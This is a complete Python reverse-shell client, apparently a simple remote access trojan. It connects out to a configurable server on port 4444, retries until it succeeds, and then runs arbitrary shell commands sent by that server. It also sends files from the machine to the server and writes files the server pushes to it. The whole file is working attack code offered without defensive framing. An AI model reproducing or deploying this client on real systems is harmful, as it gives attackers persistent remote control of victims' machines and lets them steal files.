#!/usr/bin/env python3
import socket
import json
import subprocess
import os
import base64
import time

HOST = "192.168.56.1"  # Change to your server IP
PORT = 4444

def connect():
    """Connect to server with retry logic."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            print(f"[+] Connected to {HOST}:{PORT}")
            return s
        except:
            print("[!] Connection failed, retrying...")
            time.sleep(3)

def send(s, data):
    """Send JSON-encoded data."""
    s.send(json.dumps(data).encode())

def receive(s):
    """Receive and decode JSON data."""
    data = b""
    while True:
        chunk = s.recv(1024)
        data += chunk
        if len(chunk) < 1024:
            break
    return json.loads(data.decode())

def run(s):
    """Main command loop."""
    while True:
        try:
            cmd = receive(s)
            
            if cmd["command"] == "exit":
                send(s, {"result": "Exiting..."})
                break
                
            elif cmd["command"] == "cd":
                try:
                    os.chdir(cmd["path"])
                    send(s, {"result": f"Changed to {os.getcwd()}", "cwd": os.getcwd()})
                except Exception as e:
                    send(s, {"result": f"cd error: {e}"})
                    
            elif cmd["command"] == "download":
                try:
                    with open(cmd["path"], "rb") as f:
                        file_data = base64.b64encode(f.read()).decode()
                    send(s, {"result": "File sent", "file_data": file_data, "filename": cmd["path"]})
                except Exception as e:
                    send(s, {"result": f"Download error: {e}"})
                    
            elif cmd["command"] == "upload":
                try:
                    data = base64.b64decode(cmd["file_data"])
                    with open(cmd["path"], "wb") as f:
                        f.write(data)
                    send(s, {"result": f"Uploaded to {cmd['path']}", "cwd": os.getcwd()})
                except Exception as e:
                    send(s, {"result": f"Upload error: {e}"})
                    
            else:
                # Execute command
                proc = subprocess.Popen(
                    cmd["command"], shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    universal_newlines=True
                )
                stdout, stderr = proc.communicate()
                result = stdout + stderr
                send(s, {"result": result, "cwd": os.getcwd()})
                
        except Exception as e:
            send(s, {"result": f"Error: {e}"})

if __name__ == "__main__":
    while True:
        s = connect()
        run(s)
        s.close()